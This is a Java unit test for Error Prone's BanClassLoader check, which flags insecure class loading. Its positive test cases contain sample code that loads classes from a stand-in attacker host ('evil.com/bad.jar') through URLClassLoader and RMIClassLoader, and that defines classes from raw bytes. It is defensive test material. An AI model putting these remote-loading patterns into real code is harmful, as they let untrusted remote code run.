/*
 * Copyright 2023 The Error Prone Authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.errorprone.bugpatterns;

import com.google.errorprone.BugCheckerRefactoringTestHelper;
import com.google.errorprone.CompilationTestHelper;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.JUnit4;

/** {@link BanClassLoader}Test */
@RunWith(JUnit4.class)
public class BanClassLoaderTest {
  private final CompilationTestHelper compilationHelper =
      CompilationTestHelper.newInstance(BanClassLoader.class, getClass());

  private final BugCheckerRefactoringTestHelper refactoringHelper =
      BugCheckerRefactoringTestHelper.newInstance(BanClassLoader.class, getClass());

  @Test
  public void positiveCase() {
    compilationHelper
        .addSourceLines(
            "BanClassLoaderPositiveCases.java",
            """
package com.google.errorprone.bugpatterns.testdata;

import static java.rmi.server.RMIClassLoader.loadClass;

import java.lang.invoke.MethodHandles;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

class BanClassLoaderPositiveCases {
  /** Override loadClass with an insecure implementation. */
  // BUG: Diagnostic contains: BanClassLoader
  class InsecureClassLoader extends URLClassLoader {
    public InsecureClassLoader() {
      super(new URL[0]);
    }

    @Override
    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
      try {
        addURL(new URL("jar:https://evil.com/bad.jar"));
      } catch (MalformedURLException e) {
      }
      return findClass(name);
    }
  }

  /** Calling static methods in java.rmi.server.RMIClassLoader. */
  public static final Class<?> loadRMI() throws ClassNotFoundException, MalformedURLException {
    // BUG: Diagnostic contains: BanClassLoader
    return loadClass("evil.com", "BadClass");
  }

  /** Calling constructor of java.net.URLClassLoader. */
  public ClassLoader loadFromURL() throws MalformedURLException {
    // BUG: Diagnostic contains: BanClassLoader
    URLClassLoader loader = new URLClassLoader(new URL[] {new URL("jar:https://evil.com/bad.jar")});
    return loader;
  }

  /** Calling methods of nested class. */
  public static final Class<?> methodHandlesDefineClass(byte[] bytes)
      throws IllegalAccessException {
    // BUG: Diagnostic contains: BanClassLoader
    return MethodHandles.lookup().defineClass(bytes);
  }
}\
""")
        .doTest();
  }

  @Test
  public void negativeCase() {
    compilationHelper
        .addSourceLines(
            "BanClassLoaderNegativeCases.java",
            """
package com.google.errorprone.bugpatterns.testdata;

import java.net.URL;
import java.net.URLClassLoader;
import java.security.SecureClassLoader;

class BanClassLoaderPositiveCases {
  /** OK to extend SecureClassLoader */
  class AnotherSecureClassLoader extends SecureClassLoader {}

  /** OK to call loadClass if it's not on RMIClassLoader */
  public final Class<?> overrideClassLoader() throws ClassNotFoundException {
    SecureClassLoader loader = new AnotherSecureClassLoader();
    return loader.loadClass("BadClass");
  }

  /** OK to define loadClass */
  private class NotClassLoader {
    protected void loadClass() {}
  }
}\
""")
        .doTest();
  }
}
